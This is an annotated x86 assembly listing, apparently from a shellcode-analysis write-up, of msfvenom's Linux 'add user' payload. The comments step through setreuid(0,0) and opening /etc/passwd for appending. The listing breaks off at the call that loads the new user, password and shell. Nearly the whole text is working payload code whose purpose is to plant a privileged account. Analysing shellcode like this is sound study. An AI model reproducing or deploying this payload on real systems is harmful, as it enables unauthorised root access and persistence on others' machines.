; add user shellcode from msfvenom
; Detailed analysis at - https://badbit.vc/index.php/2020/08/28/analyzing-shellcodes/2/

xor    ecx, ecx ; Clearing out ECX register. ECX = 0x0
mov    ebx,ecx	; Moving 0x0 in EBX register. EBX = 0x0
push   0x46		; Pushing 0x46 on the stack
pop    eax		; EAX now contains 0x46 which is a syscall to "Setreuid"
int    0x80		; Interrupt signal. sereuid(0, 0)
push   0x5		; Pushing 0x5 on the stack
pop    eax		; Moving 0x5 on in EAX register. EAX = 0x5 which is a syscall to "open".
xor    ecx,ecx	; Clearing out ECX register. ECX = 0x0
push   ecx		; Pushing 0x0 on the stack
push   0x64777373	; Pushing "sswd" in reverse order on the stack
push   0x61702f2f	; Pushing "//pa" in reverse order on the stack
push   0x6374652f	; Pushing "/etc" in reverse order on the stack
mov    ebx,esp	; Moving stack pointer in EBX which is pointing
                ; to "/etc//passwd" terminated with a null pointer
inc    ecx		; Incrementing ECX. ECX = 0x1 (O_WRONLY flag)
mov    ch,0x4	; Moving 0x4 in CH. ECX = 0x401
int    0x80	; Interrupt signal. open("/etc//passwd", 0x401, 0)
xchg   ebx,eax	; Putting the return value in ebx which is a file descriptor
                ; to "/etc/passwd"
call   0x804a093 <buf+83> ; The call function loads the address of our user, 
                          ; password and the shell to use in the stack
